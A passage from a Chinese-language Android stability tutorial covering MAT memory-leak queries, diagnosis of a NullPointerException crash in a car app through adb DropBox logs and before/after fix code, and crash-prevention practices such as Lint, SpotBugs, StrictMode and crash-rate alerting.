<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> android.app.Activity

<span class="hljs-comment">-- 查找所有Bitmap对象,按大小排序</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> android.graphics.Bitmap <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-variable">@retainedHeap</span> <span class="hljs-keyword">DESC</span>

<span class="hljs-comment">-- 查找持有特定对象的实例</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> com.example.MyClass <span class="hljs-keyword">WHERE</span> this.mService <span class="hljs-operator">!=</span> <span class="hljs-keyword">null</span>

<span class="hljs-comment">-- 查找泄漏的Context</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> INSTANCEOF android.content.Context <span class="hljs-keyword">WHERE</span> (toString(this) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">LIKE</span> ".*Application.*")
</code></pre>
<p><strong>实战示例: 分析Activity泄漏</strong></p>
<pre><code class="hljs language-text" lang="text">1. 打开Histogram视图
2. 搜索你的Activity类名
3. 右键 → "List objects" → "with incoming references"
4. 查看instances列表,正常情况应该只有1个(当前Activity)
5. 如果有多个 → 发生了泄漏!
6. 右键某个泄漏的实例 → "Path to GC Roots" → "exclude weak references"
7. 分析引用链,找出谁持有了Activity导致无法释放
</code></pre>
<p><strong>常见泄漏场景</strong>:</p>



































<table><thead><tr><th align="left">场景</th><th align="left">原因</th><th align="left">MAT特征</th><th align="left">解决方案</th></tr></thead><tbody><tr><td align="left">Handler泄漏</td><td align="left">非静态内部类持有Activity</td><td align="left">Handler → Activity</td><td align="left">改为静态内部类+WeakReference</td></tr><tr><td align="left">Listener泄漏</td><td align="left">注册监听器未注销</td><td align="left">Listener → Activity</td><td align="left">在onDestroy中unregister</td></tr><tr><td align="left">单例持有Context</td><td align="left">单例生命周期长于Activity</td><td align="left">Singleton → Activity</td><td align="left">使用ApplicationContext</td></tr><tr><td align="left">线程泄漏</td><td align="left">线程持有Activity引用</td><td align="left">Thread → Activity</td><td align="left">线程结束前清除引用</td></tr></tbody></table>
<p>下图展示了使用MAT进行内存泄漏分析的完整流程,包含三条并行的分析路径:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d34aef2148064c21b2458510546db223~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767841506&amp;x-signature=%2Fvm11xNZdbAG7RuM4Uei65batiw%3D" alt="06-03-mat-analysis-workflow.png" loading="lazy"/>
<em>图3: MAT内存泄漏分析流程 - Histogram/Dominator Tree/OQL三种分析路径</em></p>
<hr/>
<h3 data-id="heading-19">六、实战案例: NPE问题完整分析</h3>
<p>现在让我们回到开篇的那个真实案例,看看如何一步步定位和解决问题。</p>
<h4 data-id="heading-20">6.1 问题现象</h4>
<p><strong>告警信息</strong>:</p>
<pre><code class="hljs language-text" lang="text">时间: 2025-12-29 17:30
平台: 监控平台
告警: Crash率突增至15% (正常&lt;1%)
影响: 特定车型用户无法使用应用
</code></pre>
<p><strong>用户反馈</strong>:</p>
<ul>
<li>"打开应用就闪退"</li>
<li>"升级新版本后无法使用"</li>
<li>只在特定车型(ModelX)上出现</li>
</ul>
<h4 data-id="heading-21">6.2 日志分析</h4>
<p><strong>第一步: 从DropBox提取最新异常</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ adb shell dumpsys dropbox --<span class="hljs-built_in">print</span> data_app_crash | <span class="hljs-built_in">head</span> -n 50

Drop box contents: 324 entries

2025-12-29 17:28:15 data_app_crash (text, 8932 bytes)
Process: com.example.carapp
PID: 15234
Flags: 0x38d83e44
Package: com.example.carapp v102 (1.0.2)
Foreground: Yes

java.lang.NullPointerException: Attempt to invoke interface method <span class="hljs-string">'int android.car.hardware.property.ICarProperty.getIntProperty(int, int)'</span> on a null object reference
    at com.example.carapp.property.CarPropertyManager.getProperty(CarPropertyManager.java:123)
    at com.example.carapp.ui.MainActivity.initCarConfig(MainActivity.java:89)
    at com.example.carapp.ui.MainActivity.onCreate(MainActivity.java:56)
    at android.app.Activity.performCreate(Activity.java:8051)
    ...
</code></pre>
<p><strong>关键信息提取</strong>:</p>



































<table><thead><tr><th align="left">信息项</th><th align="left">内容</th><th align="left">分析</th></tr></thead><tbody><tr><td align="left">异常类型</td><td align="left">NullPointerException</td><td align="left">空指针问题</td></tr><tr><td align="left">崩溃点</td><td align="left">CarPropertyManager.java:123</td><td align="left">mService对象为null</td></tr><tr><td align="left">调用链</td><td align="left">MainActivity.onCreate → initCarConfig → getProperty</td><td align="left">启动时获取车辆属性失败</td></tr><tr><td align="left">应用版本</td><td align="left">v102 (1.0.2)</td><td align="left">新版本引入的问题</td></tr><tr><td align="left">前台应用</td><td align="left">Yes</td><td align="left">用户直接感知,影响严重</td></tr></tbody></table>
<p><strong>第二步: 查看源码</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CarPropertyManager.java:123</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarPropertyManager</span> {
    <span class="hljs-keyword">private</span> ICarProperty mService;  <span class="hljs-comment">// ← 这里为null!</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CarPropertyManager</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-comment">// 通过Binder获取Car服务</span>
        <span class="hljs-type">IBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> ServiceManager.getService(Context.CAR_SERVICE);
        <span class="hljs-keyword">if</span> (binder != <span class="hljs-literal">null</span>) {
            mService = ICarProperty.Stub.asInterface(binder);
        }
        <span class="hljs-comment">// 问题: 如果服务不存在,mService就是null,但没有处理!</span>
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProperty</span><span class="hljs-params">(<span class="hljs-type">int</span> propertyId)</span> {
        <span class="hljs-comment">// 直接调用mService,没有空指针检查!</span>
        <span class="hljs-keyword">return</span> mService.getIntProperty(propertyId, <span class="hljs-number">0</span>);  <span class="hljs-comment">// ← NPE发生在这里</span>
    }
}
</code></pre>
<p><strong>第三步: 分析根本原因</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查Car服务是否存在</span>
$ adb shell service list | grep car

<span class="hljs-comment"># 在ModelX车型上输出:</span>
<span class="hljs-comment"># 149    car_service: [android.car.ICar]  ← 服务存在</span>

<span class="hljs-comment"># 但是检查Property服务:</span>
$ adb shell dumpsys car_service | grep -A 10 <span class="hljs-string">"Property"</span>

<span class="hljs-comment"># 输出:</span>
<span class="hljs-comment"># CarPropertyService: NOT_AVAILABLE  ← Property服务不可用!</span>
<span class="hljs-comment"># Reason: Config file missing (/vendor/etc/car_property_config.xml)</span>
</code></pre>
<p><strong>根本原因确认</strong>:</p>
<ol>
<li>ModelX车型缺少车辆属性配置文件:<code>/vendor/etc/car_property_config.xml</code></li>
<li>导致CarPropertyService无法初始化</li>
<li>ServiceManager返回null</li>
<li>代码没有做空指针保护,直接崩溃</li>
</ol>
<h4 data-id="heading-22">6.3 代码分析与修复</h4>
<p><strong>Before (有问题的代码)</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarPropertyManager</span> {
    <span class="hljs-keyword">private</span> ICarProperty mService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CarPropertyManager</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">IBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> ServiceManager.getService(Context.CAR_SERVICE);
        <span class="hljs-keyword">if</span> (binder != <span class="hljs-literal">null</span>) {
            mService = ICarProperty.Stub.asInterface(binder);
        }
        <span class="hljs-comment">// 没有处理mService == null的情况</span>
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProperty</span><span class="hljs-params">(<span class="hljs-type">int</span> propertyId)</span> {
        <span class="hljs-keyword">return</span> mService.getIntProperty(propertyId, <span class="hljs-number">0</span>);  <span class="hljs-comment">// NPE!</span>
    }
}

<span class="hljs-comment">// MainActivity.java</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    initCarConfig();  <span class="hljs-comment">// 直接调用,没有异常处理</span>
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initCarConfig</span><span class="hljs-params">()</span> {
    <span class="hljs-type">CarPropertyManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarPropertyManager</span>(<span class="hljs-built_in">this</span>);
    <span class="hljs-type">int</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> manager.getProperty(PROPERTY_CONFIG_TIMEOUT);  <span class="hljs-comment">// 崩溃!</span>
    <span class="hljs-comment">// 使用timeout...</span>
}
</code></pre>
<p><strong>After (修复后的代码)</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarPropertyManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"CarPropertyManager"</span>;
    <span class="hljs-keyword">private</span> ICarProperty mService;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> mServiceAvailable;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CarPropertyManager</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">IBinder</span> <span class="hljs-variable">binder</span> <span class="hljs-operator">=</span> ServiceManager.getService(Context.CAR_SERVICE);
            <span class="hljs-keyword">if</span> (binder != <span class="hljs-literal">null</span>) {
                mService = ICarProperty.Stub.asInterface(binder);
                mServiceAvailable = (mService != <span class="hljs-literal">null</span>);
            } <span class="hljs-keyword">else</span> {
                Log.w(TAG, <span class="hljs-string">"Car service not available"</span>);
                mServiceAvailable = <span class="hljs-literal">false</span>;
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            Log.e(TAG, <span class="hljs-string">"Failed to connect to car service"</span>, e);
            mServiceAvailable = <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * 检查服务是否可用
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isServiceAvailable</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> mServiceAvailable;
    }

    <span class="hljs-comment">/**
     * 获取车辆属性
     * <span class="hljs-doctag">@param</span> propertyId 属性ID
     * <span class="hljs-doctag">@param</span> defaultValue 服务不可用时的默认值
     * <span class="hljs-doctag">@return</span> 属性值
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProperty</span><span class="hljs-params">(<span class="hljs-type">int</span> propertyId, <span class="hljs-type">int</span> defaultValue)</span> {
        <span class="hljs-keyword">if</span> (!mServiceAvailable || mService == <span class="hljs-literal">null</span>) {
            Log.w(TAG, <span class="hljs-string">"Service not available, returning default value: "</span> + defaultValue);
            <span class="hljs-keyword">return</span> defaultValue;
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> mService.getIntProperty(propertyId, <span class="hljs-number">0</span>);
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            Log.e(TAG, <span class="hljs-string">"Failed to get property: "</span> + propertyId, e);
            <span class="hljs-keyword">return</span> defaultValue;
        }
    }
}

<span class="hljs-comment">// MainActivity.java</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
    <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    initCarConfig();
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initCarConfig</span><span class="hljs-params">()</span> {
    <span class="hljs-type">CarPropertyManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CarPropertyManager</span>(<span class="hljs-built_in">this</span>);

    <span class="hljs-comment">// 先检查服务是否可用</span>
    <span class="hljs-keyword">if</span> (!manager.isServiceAvailable()) {
        Log.w(TAG, <span class="hljs-string">"Car property service not available, using default config"</span>);
        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">"部分车辆功能不可用"</span>, Toast.LENGTH_SHORT).show();
        <span class="hljs-comment">// 使用默认配置</span>
        applyDefaultConfig();
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 提供默认值,即使获取失败也不会崩溃</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> manager.getProperty(PROPERTY_CONFIG_TIMEOUT, <span class="hljs-number">5000</span>);
    applyConfig(timeout);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">applyDefaultConfig</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 使用硬编码的默认配置</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">defaultTimeout</span> <span class="hljs-operator">=</span> <span class="hljs-number">5000</span>;
    applyConfig(defaultTimeout);
}
</code></pre>
<p><strong>修复要点</strong>:</p>
<ol>
<li>
<p><strong>空指针检查</strong>:</p>
<ul>
<li>添加<code>isServiceAvailable()</code>方法</li>
<li>在调用前检查服务状态</li>
</ul>
</li>
<li>
<p><strong>异常捕获</strong>:</p>
<ul>
<li>捕获<code>RemoteException</code></li>
<li>避免Binder调用失败导致崩溃</li>
</ul>
</li>
<li>
<p><strong>默认值处理</strong>:</p>
<ul>
<li><code>getProperty()</code>方法增加<code>defaultValue</code>参数</li>
<li>服务不可用时返回默认值</li>
</ul>
</li>
<li>
<p><strong>用户体验</strong>:</p>
<ul>
<li>降级处理:使用默认配置继续运行</li>
<li>友好提示:Toast告知用户部分功能不可用</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-23">七、最佳实践与预防措施</h3>
<p>通过前面的案例分析,我们总结出一套Java异常预防的最佳实践。</p>
<h4 data-id="heading-24">7.1 编码规范</h4>
<p><strong>1. 防御性编程</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ❌ 错误示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">(User user)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();  <span class="hljs-comment">// user可能为null!</span>
    Log.d(TAG, <span class="hljs-string">"Processing user: "</span> + name);
}

<span class="hljs-comment">// ✅ 正确示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> User user)</span> {
    <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
        Log.w(TAG, <span class="hljs-string">"User is null, skipping processing"</span>);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();
    Log.d(TAG, <span class="hljs-string">"Processing user: "</span> + name);
}
</code></pre>
<p><strong>2. 使用注解</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> androidx.annotation.NonNull;
<span class="hljs-keyword">import</span> androidx.annotation.Nullable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserManager</span> {
    <span class="hljs-comment">// 明确标注参数不能为null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> User user)</span> {
        <span class="hljs-comment">// IDE和Lint会检查调用处是否传入null</span>
        saveToDatabase(user);
    }

    <span class="hljs-comment">// 明确标注返回值可能为null</span>
    <span class="hljs-meta">@Nullable</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findUser</span><span class="hljs-params">(<span class="hljs-type">int</span> userId)</span> {
        <span class="hljs-keyword">return</span> userCache.get(userId);
    }
}
</code></pre>
<p><strong>3. 异常处理原则</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 原则1: 不要吞掉异常</span>
<span class="hljs-keyword">try</span> {
    riskyOperation();
} <span class="hljs-keyword">catch</span> (Exception e) {
    <span class="hljs-comment">// ❌ 什么都不做,问题被隐藏</span>
}

<span class="hljs-comment">// 原则2: 记录日志</span>
<span class="hljs-keyword">try</span> {
    riskyOperation();
} <span class="hljs-keyword">catch</span> (Exception e) {
    <span class="hljs-comment">// ✅ 记录异常信息</span>
    Log.e(TAG, <span class="hljs-string">"Failed to execute risky operation"</span>, e);
}

<span class="hljs-comment">// 原则3: 优雅降级</span>
<span class="hljs-keyword">try</span> {
    loadDataFromNetwork();
} <span class="hljs-keyword">catch</span> (IOException e) {
    Log.w(TAG, <span class="hljs-string">"Network failed, loading from cache"</span>, e);
    loadDataFromCache();  <span class="hljs-comment">// 降级方案</span>
}

<span class="hljs-comment">// 原则4: 向上抛出不可恢复的异常</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">criticalOperation</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CriticalException {
    <span class="hljs-keyword">try</span> {
        performCriticalTask();
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CriticalException</span>(<span class="hljs-string">"Critical task failed"</span>, e);
    }
}
</code></pre>
<p><strong>4. 资源管理</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ✅ 使用try-with-resources自动关闭资源</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">readFile</span><span class="hljs-params">(String path)</span> {
    <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(path))) {
        <span class="hljs-keyword">return</span> reader.readLine();
    } <span class="hljs-keyword">catch</span> (IOException e) {
        Log.e(TAG, <span class="hljs-string">"Failed to read file: "</span> + path, e);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// 或者手动管理</span>
<span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
<span class="hljs-keyword">try</span> {
    cursor = database.query(...);
    <span class="hljs-comment">// 使用cursor</span>
} <span class="hljs-keyword">finally</span> {
    <span class="hljs-keyword">if</span> (cursor != <span class="hljs-literal">null</span>) {
        cursor.close();  <span class="hljs-comment">// 确保资源释放</span>
    }
}
</code></pre>
<h4 data-id="heading-25">7.2 工具集成</h4>
<p><strong>1. Lint静态检查</strong>:</p>
<pre><code class="hljs language-gradle" lang="gradle">android {
    lintOptions {
        // 将警告提升为错误
        warningsAsErrors true

        // 启用空指针检查
        check 'NullPointer'

        // 检查资源泄漏
        check 'Recycle'

        // 生成HTML报告
        htmlReport true
        htmlOutput file("$project.buildDir/reports/lint-results.html")
    }
}
</code></pre>
<p><strong>2. FindBugs/SpotBugs</strong>:</p>
<pre><code class="hljs language-gradle" lang="gradle">plugins {
    id 'com.github.spotbugs' version '5.0.13'
}

spotbugs {
    effort = 'max'
    reportLevel = 'low'
}

tasks.withType(com.github.spotbugs.snom.SpotBugsTask) {
    reports {
        html.enabled = true
        xml.enabled = false
    }
}
</code></pre>
<p><strong>3. StrictMode开发时检查</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onCreate();

        <span class="hljs-keyword">if</span> (BuildConfig.DEBUG) {
            <span class="hljs-comment">// 检测主线程上的耗时操作</span>
            StrictMode.setThreadPolicy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StrictMode</span>.ThreadPolicy.Builder()
                .detectDiskReads()
                .detectDiskWrites()
                .detectNetwork()
                .penaltyLog()
                .build());

            <span class="hljs-comment">// 检测内存泄漏</span>
            StrictMode.setVmPolicy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StrictMode</span>.VmPolicy.Builder()
                .detectLeakedSqlLiteObjects()
                .detectLeakedClosableObjects()
                .detectActivityLeaks()
                .penaltyLog()
                .build());
        }
    }
}
</code></pre>
<h4 data-id="heading-26">7.3 监控预警</h4>
<p><strong>1. Crash率监控</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CrashMonitorService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">float</span> <span class="hljs-variable">CRASH_RATE_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.02f</span>;  <span class="hljs-comment">// 2%</span>

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkCrashRate</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">totalUsers</span> <span class="hljs-operator">=</span> getTotalActiveUsers();
        <span class="hljs-type">int</span> <span class="hljs-variable">crashedUsers</span> <span class="hljs-operator">=</span> getCrashedUsers();

        <span class="hljs-type">float</span> <span class="hljs-variable">crashRate</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>) crashedUsers / totalUsers;

        <span class="hljs-keyword">if</span> (crashRate &gt; CRASH_RATE_THRESHOLD) {
            <span class="hljs-comment">// 触发告警</span>
            alertOps(<span class="hljs-string">"Crash rate exceeded threshold: "</span> + crashRate);
        }
    }
}
</code></pre>
<p><strong>2. 异常聚合分析</strong>:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># crash_aggregator.py - 异常聚合脚本</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter

<span class="hljs-keyword">def</span> <span class="hljs-title function_">aggregate_crashes</span>(<span class="hljs-params">log_dir</span>):
    <span class="hljs-string">"""聚合相同root cause的异常"""</span>
    crashes = []

    <span class="hljs-keyword">for</span> log_file <span class="hljs-keyword">in</span> os.listdir(log_dir):
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(log_dir, log_file)) <span class="hljs-keyword">as</span> f:
            content = f.read()

            <span class="hljs-comment"># 提取异常类型和崩溃点</span>
            exception_type = re.search(<span class="hljs-string">r'(java\.lang\.\w+Exception)'</span>, content)
            crash_location = re.search(<span class="hljs-string">r'at ([\w\.]+)\(([\w\.]+):(\d+)\)'</span>, content)

            <span class="hljs-keyword">if</span> exception_type <span class="hljs-keyword">and</span> crash_location:
                key = <span class="hljs-string">f"<span class="hljs-subst">{exception_type.group(<span class="hljs-number">1</span>)}</span>@<span class="hljs-subst">{crash_location.group(<span class="hljs-number">1</span>)}</span>"</span>
                crashes.append(key)

    <span class="hljs-comment"># 统计并排序</span>
    counter = Counter(crashes)
    <span class="hljs-keyword">for</span> crash_type, count <span class="hljs-keyword">in</span> counter.most_common(<span class="hljs-number">10</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{crash_type}</span>: <span class="hljs-subst">{count}</span> times"</span>)

aggregate_crashes(<span class="hljs-string">"/path/to/dropbox_logs"</span>)
</code></pre>
<p><strong>输出示例</strong>:</p>
<pre><code class="hljs language-text" lang="text">NullPointerException@CarPropertyManager.getProperty: 42 times
IndexOutOfBoundsException@RecyclerView.onBindViewHolder: 15 times
ClassCastException@MainActivity.handleMessage: 8 times
</code></pre>
<p><strong>3. 自动化告警</strong>:</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># prometheus_alert_rules.yml</span>

<span class="hljs-attr">groups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">app_crash_alerts</span>
    <span class="hljs-attr">rules:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighCrashRate</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">app_crash_rate</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">0.02</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"App crash rate is too high"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"Crash rate is <span class="hljs-template-variable">{{ $value }}</span>, exceeds 2% threshold"</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">NewCrashType</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">increase(app_crash_types[1h])</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">0</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"New crash type detected"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"A new type of crash appeared in the last hour"</span>
</code></pre>
<hr/>
<h3 data-id="heading-27">八、总结</h3>
<p>通过本文的学习,你应该已经掌握了Java异常分析的完整方法论。让我们回顾一下核心要点:</p>
<p><strong>知识体系</strong>:</p>
<ol>
<li>✅ Java异常体系 (Error/Exception/Checked/Unchecked)</li>
<li>✅ Android异常处理机制 (UncaughtExceptionHandler/AMS/DropBox)</li>
<li>✅ JE日志结构 (进程信息/异常栈/链式异常)</li>
</ol>
<p><strong>工具技能</strong>:</p>
<ol>
<li>✅ Logcat实时监控 (过滤技巧/正则搜索/输出到文件)</li>
<li>✅ DropBox日志分析 (提取日志/批量分析/统计聚合)</li>
<li>✅ MAT内存分析 (Histogram/Dominator Tree/OQL查询)</li>
</ol>
<p><strong>实战能力</strong>:</p>
<ol>
<li>✅ 快速定位问题根因 (日志分析→源码追踪→根因确认)</li>
<li>✅ 代码修复与防御 (空指针检查/异常处理/默认值)</li>
<li>✅ 验证与预防 (单元测试/Lint检查/监控告警)</li>
</ol>
<p><strong>Java异常 vs Native Crash对比</strong>:</p>



































<table><thead><tr><th align="left">维度</th><th align="left">Java异常</th><th align="left">Native Crash</th></tr></thead><tbody><tr><td align="left">调试难度</td><td align="left">⭐⭐ 较简单</td><td align="left">⭐⭐⭐⭐⭐ 非常困难</td></tr><tr><td align="left">堆栈信息</td><td align="left">完整的Java调用栈</td><td align="left">机器码地址,需符号化</td></tr><tr><td align="left">常用工具</td><td align="left">Logcat, DropBox, MAT</td><td align="left">addr2line, ndk-stack, gdb</td></tr><tr><td align="left">主要原因</td><td align="left">NPE, 越界, 类型转换</td><td align="left">内存访问错误, 信号异常</td></tr><tr><td align="left">影响范围</td><td align="left">通常局限于单个功能</td><td align="left">可能导致进程崩溃</td></tr></tbody></table>
<h3 data-id="heading-28">相关文章</h3>
<ul>
<li><a href="https://juejin.cn/post/7589477775210577972" target="_blank" title="https://juejin.cn/post/7589477775210577972">上一篇: 稳定性性能系列之五——Native Crash深度分析:工具实战</a></li>
<li><a href="https://juejin.cn/post/7587473691170095104" target="_blank" title="https://juejin.cn/post/7587473691170095104">系列目录: Android系统稳定性与性能优化</a></li>
</ul>
<hr/>
<blockquote>
<p><strong>作者简介</strong>: 多年Android系统开发经验,专注于系统稳定性与性能优化领域。欢迎关注本系列,一起深入Android系统的精彩世界!</p>
</blockquote>
<hr/>
<h4 data-id="heading-29">🎉 感谢关注,让我们一起深入Android系统的精彩世界!</h4>
<h4 data-id="heading-30"><strong>找到我</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a></h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>